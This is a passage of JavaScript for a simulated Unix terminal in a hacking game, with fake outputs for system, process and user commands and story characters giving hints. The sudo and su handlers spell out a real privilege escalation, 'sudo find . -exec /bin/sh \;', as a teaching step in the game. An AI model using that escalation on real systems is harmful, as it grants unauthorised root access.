			return Array.from({ length: maxLen }, (_, i) => ({
				t: "info",
				s: contents.map((c) => c[i] || "").join(delim === "\\t" ? "\t" : delim),
			}));
		};

		h.column = (args) => {
			const content = this._pipeStdin || "";
			if (!content.trim())
				return [
					{
						t: "dim",
						s: "column: formats text in columns. Pipe text into it.",
					},
				];
			const lines = content.split("\n").filter(Boolean);
			const cols = lines.map((l) => l.split(/\s+/));
			const widths = [];
			cols.forEach((row) =>
				row.forEach((cell, i) => {
					widths[i] = Math.max(widths[i] || 0, cell.length);
				}),
			);
			return cols.map((row) => ({
				t: "info",
				s: row.map((cell, i) => cell.padEnd(widths[i] + 2)).join(""),
			}));
		};

		h.rev = (args) => {
			const content =
				this._pipeStdin ||
				(args[0]
					? (() => {
							const r = fs.cat(args[0]);
							return r.error ? "" : r.content;
						})()
					: "");
			if (!content)
				return [
					{
						t: "dim",
						s: "rev: reverses characters in each line. Pipe text into it.",
					},
				];
			return content
				.split("\n")
				.map((l) => ({ t: "info", s: [...l].reverse().join("") }));
		};

		h.shuf = (args) => {
			const nIdx = args.indexOf("-n");
			const n = nIdx >= 0 ? parseInt(args[nIdx + 1]) : null;
			const content =
				this._pipeStdin ||
				(args.find((a) => !a.startsWith("-"))
					? (() => {
							const r = fs.cat(args.find((a) => !a.startsWith("-")));
							return r.error ? "" : r.content;
						})()
					: "");
			if (!content)
				return [
					{
						t: "dim",
						s: "shuf: shuffles lines randomly. Pipe text or specify file.",
					},
				];
			const lines = content.split("\n").filter(Boolean);
			const shuffled = lines.sort(() => Math.random() - 0.5);
			const output = n ? shuffled.slice(0, n) : shuffled;
			return output.map((s) => ({ t: "info", s }));
		};

		h.nl = (args) => {
			const content =
				this._pipeStdin ||
				(args[0]
					? (() => {
							const r = fs.cat(args[0]);
							return r.error ? "" : r.content;
						})()
					: "");
			if (!content) return [{ t: "error", s: "nl: missing operand" }];
			return content.split("\n").map((l, i) => ({
				t: "info",
				s: `${String(i + 1).padStart(6)}\t${l}`,
			}));
		};

		h.seq = (args) => {
			const nums = args.filter((a) => !a.startsWith("-")).map(Number);
			const [first, incr, last] =
				nums.length === 3
					? nums
					: nums.length === 2
						? [nums[0], 1, nums[1]]
						: [1, 1, nums[0]];
			if (!last || isNaN(last))
				return [{ t: "error", s: "seq: missing operand" }];
			const results = [];
			for (let i = first; i <= last; i += incr)
				results.push({ t: "info", s: String(i) });
			if (results.length > 100)
				return [
					...results.slice(0, 5),
					{ t: "dim", s: "..." },
					results[results.length - 1],
				];
			return results;
		};

		h.yes = (args) => {
			const msg = args.join(" ") || "y";
			const lines = [];
			for (let i = 0; i < 20; i++) lines.push({ t: "dim", s: msg });
			lines.push({ t: "dim", s: "(... repeating — Ctrl+C to stop)" });
			return lines;
		};

		h.bc = (args) => {
			const expr = args.join(" ") || this._pipeStdin || "";
			if (!expr.trim())
				return [
					{
						t: "dim",
						s: 'bc: arbitrary precision calculator\nUsage: echo "2^10" | bc\nExample: bc <<< "scale=2; 355/113"',
					},
				];
			try {
				// Safe eval of math expressions
				const safeExpr = expr
					.replace(/\^/g, "**")
					.replace(/[^0-9+\-*/().\s]/g, "");
				if (safeExpr.trim()) {
					// eslint-disable-next-line no-new-func
					const result = Function('"use strict"; return (' + safeExpr + ")")();
					return [{ t: "info", s: String(result) }];
				}
			} catch {}
			return [{ t: "error", s: `bc: syntax error: ${expr}` }];
		};

		h.expr = (args) => {
			const expr = args.join(" ");
			try {
				const safe = expr.replace(/\^/g, "**").replace(/[^0-9+\-*/().\s]/g, "");
				// eslint-disable-next-line no-new-func
				return [
					{
						t: "info",
						s: String(Function('"use strict"; return (' + safe + ")")()),
					},
				];
			} catch {
				return [{ t: "error", s: `expr: invalid expression: ${expr}` }];
			}
		};

		h.jq = (args) => {
			const filter =
				args.find((a) => a.startsWith(".") || a === "keys" || a === "values") ||
				".";
			const fileArg = args.find(
				(a) => !a.startsWith(".") && !a.startsWith("-") && a !== filter,
			);
			const content = fileArg
				? (() => {
						const r = fs.cat(fileArg);
						return r.error ? this._pipeStdin : r.content;
					})()
				: this._pipeStdin;
			if (!content)
				return [
					{
						t: "dim",
						s: "jq: JSON processor\nUsage: cat file.json | jq .\nExample: cat status.json | jq .chimera",
					},
				];
			try {
				const obj = JSON.parse(content);
				if (filter === ".")
					return [{ t: "success", s: JSON.stringify(obj, null, 2) }];
				if (filter.startsWith(".")) {
					const key = filter
						.slice(1)
						.split(".")
						.reduce((o, k) => o && o[k], obj);
					return [
						{
							t: "success",
							s:
								typeof key === "object"
									? JSON.stringify(key, null, 2)
									: String(key),
						},
					];
				}
				if (filter === "keys")
					return Object.keys(obj).map((k) => ({ t: "info", s: k }));
				return [{ t: "success", s: JSON.stringify(obj, null, 2) }];
			} catch (e) {
				return [{ t: "error", s: `jq: ${e.message}` }];
			}
		};

		h.od = (args) => {
			const file = args.find((a) => !a.startsWith("-"));
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? "" : r.content;
					})()
				: this._pipeStdin || "";
			const out = [];
			for (let i = 0; i < Math.min(content.length, 64); i += 16) {
				const chunk = content.slice(i, i + 16);
				const hex = [...chunk]
					.map((c) => c.charCodeAt(0).toString(8).padStart(3, "0"))
					.join(" ");
				const addr = i.toString(8).padStart(7, "0");
				out.push({ t: "dim", s: `${addr} ${hex}` });
			}
			return out.length
				? out
				: [{ t: "dim", s: "od: octal dump of file contents" }];
		};

		h.xxd = (args) => {
			const file = args.find((a) => !a.startsWith("-"));
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? null : r.content;
					})()
				: this._pipeStdin;
			if (content === null)
				return [{ t: "error", s: `xxd: ${file}: No such file or directory` }];
			if (!content)
				return [
					{
						t: "dim",
						s: "xxd: hex dump utility. Specify a file or pipe input.",
					},
				];
			const out = [];
			for (let i = 0; i < Math.min(content.length, 256); i += 16) {
				const chunk = content.slice(i, i + 16);
				const hex = [...chunk]
					.map((c) => c.charCodeAt(0).toString(16).padStart(2, "0"))
					.join(" ");
				const ascii = [...chunk]
					.map((c) =>
						c.charCodeAt(0) >= 32 && c.charCodeAt(0) < 127 ? c : ".",
					)
					.join("");
				const addr = i.toString(16).padStart(8, "0");
				out.push({ t: "dim", s: `${addr}: ${hex.padEnd(47)}  ${ascii}` });
			}
			if (content.length > 256) out.push({ t: "dim", s: "..." });
			return out;
		};

		h.hexdump = (args) => h.xxd(args);

		h.strings = (args) => {
			const minLen = args.includes("-n")
				? parseInt(args[args.indexOf("-n") + 1]) || 4
				: 4;
			const file = args.find((a) => !a.startsWith("-"));
			const content = file
				? (() => {
						const r = fs.cat(file);
						return r.error ? null : r.content;
					})()
				: this._pipeStdin;
			if (content === null)
				return [
					{ t: "error", s: `strings: ${file}: No such file or directory` },
				];
			if (!content)
				return [
					{
						t: "dim",
						s: "strings: extracts printable strings from binary files",
					},
				];
			const result = content.match(/[\x20-\x7e]{4,}/g) || [];
			return result.map((s) => ({ t: "info", s }));
		};

		h.fold = (args) => {
			const width = args.includes("-w")
				? parseInt(args[args.indexOf("-w") + 1]) || 80
				: 80;
			const content = this._pipeStdin || "";
			if (!content)
				return [
					{
						t: "dim",
						s: "fold: wraps lines to specified width. Pipe text into it.",
					},
				];
			const out = [];
			content.split("\n").forEach((line) => {
				for (let i = 0; i < line.length; i += width)
					out.push({ t: "info", s: line.slice(i, i + width) });
			});
			return out;
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 3: SYSTEM INFORMATION
		// ═══════════════════════════════════════════════════════════════

		h.whoami = () => [{ t: "info", s: this._rootShell ? "root" : "ghost" }];
		h.id = () =>
			this._rootShell
				? [{ t: "warn", s: "uid=0(root) gid=0(root) groups=0(root)" }]
				: [
						{
							t: "info",
							s: "uid=1000(ghost) gid=1000(ghost) groups=1000(ghost),4(adm),27(sudo)",
						},
					];
		h.hostname = (args) => {
			if (args.includes("-I")) return [{ t: "info", s: "10.0.1.42" }];
			return [{ t: "info", s: "terminal-depths-node-7" }];
		};
		h.uname = (args) => {
			const all = args.includes("-a");
			if (all)
				return [
					{
						t: "info",
						s: "Linux terminal-depths-node-7 5.15.0-nexus #1 SMP Thu Jan 7 06:00:00 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux",
					},
				];
			if (args.includes("-r")) return [{ t: "info", s: "5.15.0-nexus" }];
			if (args.includes("-m")) return [{ t: "info", s: "x86_64" }];
			return [{ t: "info", s: "Linux" }];
		};
		h.uptime = () => {
			const now = new Date();
			return [
				{
					t: "info",
					s: ` ${now.toLocaleTimeString()} up 6:42,  1 user,  load average: 0.42, 0.38, 0.35`,
				},
			];
		};
		h.date = (args) => {
			const fmt = args.find((a) => a.startsWith("+"));
			const d = new Date();
			if (fmt) {
				const f = fmt
					.slice(1)
					.replace("%Y", d.getFullYear())
					.replace("%m", String(d.getMonth() + 1).padStart(2, "0"))
					.replace("%d", String(d.getDate()).padStart(2, "0"))
					.replace("%H", String(d.getHours()).padStart(2, "0"))
					.replace("%M", String(d.getMinutes()).padStart(2, "0"))
					.replace("%S", String(d.getSeconds()).padStart(2, "0"));
				return [{ t: "info", s: f }];
			}
			return [{ t: "info", s: d.toString() }];
		};
		h.cal = (args) => {
			const now = new Date();
			const month = args[0] ? parseInt(args[0]) - 1 : now.getMonth();
			const year = args[1] ? parseInt(args[1]) : now.getFullYear();
			const d = new Date(year, month, 1);
			const monthName = d.toLocaleString("default", { month: "long" });
			const startDay = d.getDay();
			const daysInMonth = new Date(year, month + 1, 0).getDate();
			let cal = `    ${monthName} ${year}\nSu Mo Tu We Th Fr Sa\n`;
			cal += "   ".repeat(startDay);
			for (let i = 1; i <= daysInMonth; i++) {
				cal += String(i).padStart(2) + " ";
				if ((startDay + i) % 7 === 0) cal += "\n";
			}
			return [{ t: "info", s: cal }];
		};
		h.free = (args) => {
			const h2 = args.includes("-h");
			const fmt = h2
				? (n) =>
						n < 1024
							? `${n}K`
							: n < 1024 * 1024
								? `${(n / 1024).toFixed(1)}M`
								: `${(n / 1024 / 1024).toFixed(1)}G`
				: String;
			return [
				{
					t: "dim",
					s: "              total        used        free      shared  buff/cache   available",
				},
				{
					t: "info",
					s: `Mem:      ${fmt(8388608).padStart(12)} ${fmt(2345678).padStart(11)} ${fmt(1234567).padStart(11)} ${fmt(123456).padStart(11)} ${fmt(4808363).padStart(11)} ${fmt(5678901).padStart(11)}`,
				},
				{
					t: "dim",
					s: `Swap:     ${fmt(2097152).padStart(12)} ${fmt(0).padStart(11)} ${fmt(2097152).padStart(11)}`,
				},
			];
		};
		h.lscpu = () => [
			{ t: "info", s: "Architecture:          x86_64" },
			{ t: "dim", s: "CPU op-mode(s):        32-bit, 64-bit" },
			{ t: "dim", s: "Byte Order:            Little Endian" },
			{ t: "dim", s: "CPU(s):                4" },
			{ t: "dim", s: "Thread(s) per core:    2" },
			{ t: "dim", s: "Core(s) per socket:    2" },
			{ t: "info", s: "Model name:            NexusCorp VIRT-4C @ 2.40GHz" },
			{ t: "dim", s: "CPU MHz:               2400.000" },
			{ t: "dim", s: "L3 cache:              8192K" },
		];
		h.lsblk = () => [
			{ t: "dim", s: "NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT" },
			{ t: "info", s: "sda      8:0    0   64G  0 disk" },
			{ t: "dim", s: "├─sda1   8:1    0   60G  0 part /" },
			{ t: "dim", s: "└─sda2   8:2    0    4G  0 part [SWAP]" },
			{ t: "dim", s: "sr0     11:0    1  1024M  0 rom" },
		];
		h.df = (args) => {
			const h2 = args.includes("-h") || args.includes("-H");
			return [
				{ t: "dim", s: "Filesystem      Size  Used Avail Use% Mounted on" },
				{ t: "info", s: "/dev/sda1        60G  8.4G   48G  15% /" },
				{ t: "dim", s: "tmpfs           3.9G   12M  3.9G   1% /dev/shm" },
				{ t: "dim", s: "tmpfs           784M  908K  783M   1% /run" },
				{ t: "dim", s: "/dev/sda1        60G  8.4G   48G  15% /var" },
				{ t: "dim", s: "chimera-fs       50G  42G    5G  90% /opt/chimera" },
			];
		};
		h.du = (args) => {
			const h2 = args.includes("-h");
			const s = args.includes("-s");
			const path = args.find((a) => !a.startsWith("-")) || ".";
			if (s) return [{ t: "info", s: `${h2 ? "42M" : "43008"}\t${path}` }];
			return [
				{ t: "dim", s: `${h2 ? "4.0K" : "4"}\t${path}/.ssh` },
				{ t: "dim", s: `${h2 ? "8.0K" : "8"}\t${path}/projects` },
				{ t: "dim", s: `${h2 ? "16K" : "16"}\t${path}/tools` },
				{ t: "info", s: `${h2 ? "42M" : "43008"}\t${path}` },
			];
		};
		h.mount = () => [
			{
				t: "dim",
				s: "sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)",
			},
			{
				t: "dim",
				s: "proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)",
			},
			{ t: "info", s: "/dev/sda1 on / type ext4 (rw,relatime)" },
			{ t: "dim", s: "tmpfs on /tmp type tmpfs (rw,nosuid,nodev)" },
			{
				t: "warn",
				s: "chimera-overlay on /opt/chimera type overlay (ro,nosuid,nodev,noexec)",
			},
		];
		h.dmesg = (args) => {
			const level = args.includes("-l") ? args[args.indexOf("-l") + 1] : null;
			const out = [
				{ t: "dim", s: "[    0.000000] Booting Linux 5.15.0-nexus" },
				{ t: "dim", s: "[    0.453210] ACPI: IRQ0 used by override." },
				{
					t: "dim",
					s: "[    1.234567] NET: Registered PF_INET6 protocol family",
				},
				{
					t: "warn",
					s: "[29341.812345] nexus_mod: module loaded — surveillance active",
				},
				{
					t: "warn",
					s: "[29341.913456] nexus_mod: trace daemon started pid=9174",
				},
				{
					t: "error",
					s: "[29345.001234] nexus_mod: ANOMALY DETECTED uid=1000 — containment initiated",
				},
			];
			if (level === "warn" || level === "err")
				return out.filter((l) => l.t === "warn" || l.t === "error");
			return out;
		};
		h.sysctl = (args) => {
			if (args[0] === "-a")
				return [
					{ t: "dim", s: "kernel.hostname = terminal-depths-node-7" },
					{ t: "dim", s: "kernel.pid_max = 32768" },
					{ t: "dim", s: "net.ipv4.ip_forward = 0" },
					{ t: "warn", s: "nexus.chimera.active = 1" },
					{ t: "warn", s: "nexus.chimera.surveillance_endpoints = 847" },
					{ t: "warn", s: "nexus.trace.uid_1000 = 1" },
				];
			return [{ t: "dim", s: `sysctl: ${args.join(" ")}` }];
		};
		h.lsmod = () => [
			{ t: "dim", s: "Module                  Size  Used by" },
			{ t: "info", s: "nexus_mod             163840  3" },
			{ t: "dim", s: "e1000                 139264  0" },
			{ t: "dim", s: "virtio_balloon         24576  0" },
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 4: ENVIRONMENT & SHELL
		// ═══════════════════════════════════════════════════════════════

		h.env = () =>
			Object.entries(this.env).map(([k, v]) => ({ t: "dim", s: `${k}=${v}` }));
		h.printenv = (args) => {
			if (args.length)
				return args.map((k) => ({
					t: "info",
					s: this.env[k] !== undefined ? this.env[k] : "",
				}));
			return h.env();
		};
		h.export = (args) => {
			for (const arg of args) {
				const [k, ...vs] = arg.split("=");
				if (k && vs.length) this.env[k] = vs.join("=");
			}
			return [];
		};
		h.unset = (args) => {
			args.forEach((a) => delete this.env[a]);
			return [];
		};
		h.set = (args) => {
			if (!args.length)
				return Object.entries(this.env).map(([k, v]) => ({
					t: "dim",
					s: `${k}=${v}`,
				}));
			return [];
		};
		h.source = h["."] = (args) => {
			if (!args.length) return [{ t: "error", s: "source: filename required" }];
			const r = fs.cat(args[0]);
			if (r.error) return [{ t: "error", s: r.error }];
			return [{ t: "dim", s: `Sourced: ${args[0]}` }];
		};
		h.alias = (args) => {
			if (!args.length)
				return [
					{ t: "dim", s: "alias ll='ls -la'" },
					{ t: "dim", s: "alias la='ls -la'" },
					{ t: "dim", s: "alias l='ls -lh'" },
					{ t: "dim", s: "alias grep='grep --color=auto'" },
					{ t: "dim", s: "alias hack='echo nice try'" },
					{ t: "dim", s: "alias exit='echo there is no exit'" },
					{ t: "dim", s: "alias ..='cd ..'" },
				];
			return [];
		};
		h.history = (args) => {
			const n = args[0] ? parseInt(args[0]) : 20;
			return this.history.slice(-n).map((cmd, i) => ({
				t: "dim",
				s: `${String(this.history.length - n + i + 1).padStart(5)}  ${cmd}`,
			}));
		};
		h.clear = h.reset = () => {
			const el = document.getElementById("output");
			if (el) el.innerHTML = "";
			return [];
		};

		// ═══════════════════════════════════════════════════════════════
		// SECTION 5: PROCESSES
		// ═══════════════════════════════════════════════════════════════

		const PROCS = [
			{
				pid: 1,
				user: "root",
				cpu: "0.0",
				mem: "0.1",
				vsz: 22548,
				rss: 1832,
				tty: "?",
				stat: "Ss",
				start: "06:00",
				time: "0:01",
				cmd: "/sbin/init",
			},
			{
				pid: 435,
				user: "root",
				cpu: "0.0",
				mem: "0.1",
				vsz: 15432,
				rss: 1456,
				tty: "?",
				stat: "Ss",
				start: "06:00",
				time: "0:00",
				cmd: "/lib/systemd/systemd-journald",
			},
			{
				pid: 845,
				user: "root",
				cpu: "0.0",
				mem: "0.2",
				vsz: 12345,
				rss: 2048,
				tty: "?",
				stat: "Ss",
				start: "06:00",
				time: "0:00",
				cmd: "/usr/sbin/sshd -D",
			},
			{
				pid: 847,
				user: "ghost",
				cpu: "0.1",
				mem: "0.2",
				vsz: 15680,
				rss: 2048,
				tty: "pts/0",
				stat: "Ss",
				start: "06:01",
				time: "0:00",
				cmd: "-bash",
			},
			{
				pid: 921,
				user: "root",
				cpu: "0.0",
				mem: "0.1",
				vsz: 8192,
				rss: 768,
				tty: "?",
				stat: "Ss",
				start: "06:00",
				time: "0:00",
				cmd: "/usr/sbin/cron -f",
			},
			{
				pid: 999,
				user: "www-data",
				cpu: "0.1",
				mem: "0.5",
				vsz: 45678,
				rss: 5120,
				tty: "?",
				stat: "S",
				start: "06:00",
				time: "0:02",
				cmd: "apache2 -k start",
			},
			{
				pid: 1337,
				user: "nexus",
				cpu: "0.8",
				mem: "1.7",
				vsz: 847652,
				rss: 14320,
				tty: "?",
				stat: "Sl",
				start: "06:01",
				time: "0:24",
				cmd: "nexus-daemon --mode=shadow --config=/opt/chimera/config/master.conf",
			},
			{
				pid: 9174,
				user: "ghost",
				cpu: "0.0",
				mem: "0.1",
				vsz: 9152,
				rss: 1024,
				tty: "pts/0",
				stat: "R+",
				start: "06:42",
				time: "0:00",
				cmd: "ps aux",
			},
		];

		h.ps = (args) => {
			const flags = args.join("").replace(/-/g, "");
			const wide =
				flags.includes("a") || flags.includes("u") || flags.includes("x");
			const filtered =
				flags.includes("e") || flags.includes("a")
					? PROCS
					: PROCS.filter((p) => p.user === "ghost");
			if (wide) {
				const header =
					"USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND";
				return [
					header,
					...filtered.map(
						(p) =>
							`${p.user.padEnd(10)} ${String(p.pid).padStart(5)} ${p.cpu.padStart(4)} ${p.mem.padStart(4)} ${String(p.vsz).padStart(6)} ${String(p.rss).padStart(5)} ${p.tty.padEnd(8)} ${p.stat.padEnd(4)} ${p.start.padEnd(7)} ${p.time.padStart(6)} ${p.cmd}`,
					),
				].map((s) => ({ t: "dim", s }));
			}
			const header = "  PID TTY          TIME CMD";
			return [
				header,
				...filtered.map(
					(p) =>
						`${String(p.pid).padStart(5)} ${p.tty.padEnd(12)} ${p.time.padStart(8)} ${p.cmd.split(" ")[0]}`,
				),
			].map((s) => ({ t: "dim", s }));
		};

		h.top = h.htop = () => [
			{
				t: "system",
				s: `top - ${new Date().toLocaleTimeString()} up 6:42, 1 user, load average: 0.42, 0.38, 0.35`,
			},
			{
				t: "dim",
				s: "Tasks: 98 total, 1 running, 97 sleeping, 0 stopped, 0 zombie",
			},
			{
				t: "dim",
				s: "%Cpu(s):  2.1 us,  0.5 sy,  0.0 ni, 97.2 id,  0.1 wa,  0.0 hi,  0.0 si",
			},
			{
				t: "dim",
				s: "MiB Mem :   7892.0 total,   1234.5 free,   2345.6 used,   4311.9 buff/cache",
			},
			{ t: "dim", s: "" },
			{
				t: "dim",
				s: "  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND",
			},
			{
				t: "warn",
				s: " 1337 nexus     20   0  847652  14320   8192 S   0.8   1.7   0:24.12 nexus-daemon",
			},
			{
				t: "dim",
				s: "  999 www-data  20   0   45678   5120   2048 S   0.1   0.5   0:02.34 apache2",
			},
			{
				t: "dim",
				s: "  847 ghost     20   0   15680   2048   1024 S   0.1   0.2   0:00.05 bash",
			},
			{
				t: "dim",
				s: "    1 root      20   0   22548   1832   1024 S   0.0   0.1   0:01.05 init",
			},
			{ t: "dim", s: "" },
			{
				t: "dim",
				s: "(In a real terminal: q=quit, k=kill, r=renice, 1=per-CPU)",
			},
		];

		h.pgrep = (args) => {
			const pattern = args.find((a) => !a.startsWith("-"));
			const listProc = args.includes("-l") || args.includes("-a");
			if (!pattern) return [{ t: "error", s: "pgrep: no pattern given" }];
			const matched = PROCS.filter(
				(p) => p.cmd.includes(pattern) || p.user.includes(pattern),
			);
			if (!matched.length) return [];
			return matched.map((p) => ({
				t: "info",
				s: listProc ? `${p.pid} ${p.cmd}` : String(p.pid),
			}));
		};

		h.pkill = (args) => {
			const pattern = args.find((a) => !a.startsWith("-"));
			if (!pattern) return [{ t: "error", s: "pkill: no pattern given" }];
			if (pattern === "nexus-daemon" || pattern === "1337")
				return [
					{
						t: "warn",
						s: "pkill: (1337) Operation not permitted\n[NEXUS-DAEMON]: Did you just try to kill me? How precious.",
					},
				];
			return [
				{ t: "success", s: `pkill: killed process(es) matching '${pattern}'` },
			];
		};

		h.kill = (args) => {
			const sig = args.find((a) => a.startsWith("-")) || "-15";
			const pid = args.find((a) => !a.startsWith("-"));
			if (!pid) return [{ t: "error", s: "kill: missing PID" }];
			if (pid === "1337")
				return [
					{
						t: "warn",
						s: `kill: (1337): Operation not permitted\n[NEXUS-DAEMON]: Signal ${sig.slice(1)} received. Ignored. You cannot kill what you cannot see.`,
					},
				];
			if (pid === "1")
				return [{ t: "error", s: "kill: (1): Operation not permitted" }];
			return [{ t: "success", s: `Sent signal ${sig.slice(1)} to PID ${pid}` }];
		};

		h.killall = (args) => h.pkill(args);

		h.pstree = (args) => [
			{ t: "dim", s: "init─┬─apache2─┬─apache2" },
			{ t: "dim", s: "     │         └─apache2" },
			{ t: "dim", s: "     ├─cron" },
			{ t: "warn", s: "     ├─nexus-daemon─┬─{chimera-worker}" },
			{ t: "warn", s: "     │               ├─{heartbeat}" },
			{ t: "warn", s: "     │               └─{surveillance}" },
			{ t: "dim", s: "     ├─sshd───sshd───bash───pstree" },
			{ t: "dim", s: "     └─systemd-journal" },
		];

		h.lsof = (args) => {
			const port = args.includes("-i") ? args[args.indexOf("-i") + 1] : null;
			if (port && port.includes("8443"))
				return [
					{
						t: "dim",
						s: "COMMAND  PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME",
					},
					{
						t: "warn",
						s: "nexus-d 1337  nexus   7u  IPv4  23456      0t0  TCP *:8443 (LISTEN)",
					},
					{
						t: "warn",
						s: "[CYPHER]: Port 8443 is CHIMERA's control socket. `nc chimera-control 8443` to connect.",
					},
				];
			return [
				{
					t: "dim",
					s: "COMMAND  PID   USER   FD   TYPE DEVICE SIZE/OFF NODE NAME",
				},
				{
					t: "dim",
					s: "sshd     845   root   3u  IPv4  12345      0t0  TCP *:22 (LISTEN)",
				},
				{
					t: "dim",
					s: "apache2  999   www    4u  IPv4  12346      0t0  TCP *:80 (LISTEN)",
				},
				{
					t: "warn",
					s: "nexus-d 1337  nexus   7u  IPv4  23456      0t0  TCP *:8443 (LISTEN)",
				},
				{
					t: "dim",
					s: "bash     847   ghost   1u  CHR  136,0      0t0    3 /dev/pts/0",
				},
			];
		};

		h.jobs = () =>
			this.jobs.length
				? this.jobs.map((j, i) => ({
						t: "info",
						s: `[${i + 1}]+  Running   ${j}`,
					}))
				: [{ t: "dim", s: "(no background jobs)" }];
		h.bg = (args) => [
			{
				t: "info",
				s: "bg: no job to background (use command & to background directly)",
			},
		];
		h.fg = (args) => [{ t: "info", s: "fg: no job to foreground" }];
		h.nohup = (args) => {
			if (!args.length) return [{ t: "error", s: "nohup: missing operand" }];
			this.jobs.push(args.join(" "));
			return [
				{
					t: "success",
					s: `nohup: ignoring input and appending output to 'nohup.out'\n[${this.jobs.length}] Background process started`,
				},
			];
		};
		h.sleep = (args) => {
			const n = parseFloat(args[0]) || 1;
			return [{ t: "dim", s: `(sleeping ${n}s — instant in simulation)` }];
		};
		h.time = (args) => {
			if (!args.length) return [{ t: "error", s: "time: missing command" }];
			const cmd = args.join(" ");
			const result = this.execute(cmd);
			return [
				...result,
				{ t: "dim", s: "" },
				{ t: "dim", s: `real\t0m0.042s` },
				{ t: "dim", s: `user\t0m0.012s` },
				{ t: "dim", s: `sys\t0m0.008s` },
			];
		};
		h.watch = (args) => {
			const interval = args.includes("-n") ? args[args.indexOf("-n") + 1] : "2";
			const cmd = args
				.filter((a) => !a.startsWith("-") && a !== interval)
				.join(" ");
			return [
				{
					t: "dim",
					s: `watch -n ${interval} ${cmd} — (simulation: runs once. In real terminal, repeats every ${interval}s, Ctrl+C to stop)`,
				},
				...this.execute(cmd),
			];
		};
		h.nice = (args) => {
			const niceIdx = args.indexOf("-n");
			const n = niceIdx >= 0 ? args[niceIdx + 1] : "0";
			const cmd = args.filter((a) => !a.startsWith("-") && a !== n).join(" ");
			return [
				{ t: "dim", s: `Running '${cmd}' with niceness ${n}` },
				...this.execute(cmd),
			];
		};
		h.renice = (args) => {
			const n = args.find((a) => !isNaN(a));
			const pid = args.find((a, i) => i > 0 && !a.startsWith("-") && a !== n);
			return [
				{
					t: "success",
					s: `${pid || "???"} (process group) old priority 0, new priority ${n || "10"}`,
				},
			];
		};
		h.crontab = (args) => {
			if (args.includes("-l")) {
				const r = fs.cat("/etc/cron.d/sync");
				return r.error
					? [{ t: "dim", s: "(no crontab for ghost)" }]
					: [{ t: "info", s: r.content }];
			}
			if (args.includes("-e"))
				return [
					{
						t: "dim",
						s: "crontab: opening in editor...\n(simulation: edit /etc/cron.d/ files directly)\nFormat: minute hour day month weekday command\nExample: */5 * * * * ghost /path/to/script.sh",
					},
				];
			return [{ t: "dim", s: "crontab: -l list | -e edit | -r remove" }];
		};
		h.at = (args) => [
			{
				t: "success",
				s: `warning: commands will be executed using /bin/sh\nat> (job scheduled for ${args.join(" ")})`,
			},
		];

		// ═══════════════════════════════════════════════════════════════
		// SECTION 6: USER MANAGEMENT
		// ═══════════════════════════════════════════════════════════════

		h.su = (args) => {
			const user = args[0] || "root";
			if (user === "root" || user === "-") {
				if (!this._rootShell)
					return [
						{ t: "error", s: "su: Authentication failure" },
						{
							t: "dim",
							s: "(Need root password — or use the sudo find GTFOBins exploit: sudo find . -exec /bin/sh \\;)",
						},
					];
				return [
					{ t: "warn", s: `root@node-7:/home/ghost# ` },
					{ t: "dim", s: "(root shell active — type whoami to confirm)" },
				];
			}
			return [
				{
					t: "error",
					s: `su: user ${user} does not exist or the user entry does not contain all the required fields`,
				},
			];
		};
		h.sudo = (args) => {
			if (args[0] === "-l")
				return [
					{ t: "info", s: "Matching Defaults entries for ghost on node-7:" },
					{
						t: "dim",
						s: '    env_reset, mail_badpass, secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"',
					},
					{ t: "dim", s: "" },
					{
						t: "info",
						s: "User ghost may run the following commands on node-7:",
					},
					{ t: "success", s: "    (root) NOPASSWD: /usr/bin/find" },
					{ t: "dim", s: "" },
					{
						t: "warn",
						s: "[CYPHER]: /usr/bin/find with NOPASSWD?! That's a GTFOBins exploit!",
					},
					{
						t: "warn",
						s: "[CYPHER]: sudo find . -exec /bin/sh \\; will give you root!",
					},
				];
			if (args[0] === "su" || args[0] === "-i" || args[0] === "-s") {
				this._rootShell = true;
				gs.unlock("root_obtained");
				return [
					{ t: "success", s: "root@node-7:~#" },
					{
						t: "warn",
						s: "[ADA-7]: Root shell active! Now get into /opt/chimera.",
					},
				];
			}
			if (args[0] === "find") {
				// Delegate to find handler with exec detection
				if (
					args.includes("-exec") &&
					(args.includes("/bin/sh") || args.includes("/bin/bash"))
				) {
					this._rootShell = true;
					gs.unlock("root_obtained");
					gs.addXP(50, "security");
					return [
						{ t: "success", s: "# whoami\nroot" },
						{
							t: "warn",
							s: "[ADA-7]: GTFOBins exploit successful! You have root!",
						},
						{
							t: "warn",
							s: "[ADA-7]: Go. /opt/chimera/keys/master.key — get it now.",
						},
						{ t: "xp", s: "+50 XP — PRIVILEGE_ESCALATED" },
					];
				}
				return h.find(args.slice(1));
			}
			if (args[0] === "!!")
				return [
					{
						t: "warn",
						s: "sudo !!: repeating last command as root... (classic Unix joke)",
					},
				];
			if (
				args[0] === "make" &&
				args[1] === "me" &&
				args[2] === "a" &&
				args[3] === "sandwich"
			) {
				return [
					{ t: "success", s: "Okay.\n[sandwich]" },
					{ t: "warn", s: "[ADA-7]: (xkcd #149 confirmed. You nerd.)" },
				];
			}
			return [
				{
					t: "error",
					s: `sudo: ${args.join(" ")}: command not found or not in sudoers\n(ghost can only sudo: /usr/bin/find)`,
				},
			];
		};

		h.passwd = (args) => {
			const user = args[0] || "ghost";
			if (user === "root" && !this._rootShell)
				return [
					{
						t: "error",
						s: "passwd: You may not view or modify password information for root.",
					},
				];
			return [
				{ t: "info", s: `Changing password for ${user}.` },
				{ t: "dim", s: "Current password: [simulation — no actual change]" },
				{ t: "dim", s: "New password:" },
				{ t: "dim", s: "Retype new password:" },
				{ t: "success", s: `passwd: password updated successfully` },
			];
		};
		h.useradd = (args) => {
			if (!this._rootShell)
				return [{ t: "error", s: "useradd: Permission denied" }];
			const user = args[args.length - 1];
			return [{ t: "success", s: `useradd: created user ${user}` }];
		};
		h.usermod = (args) => {
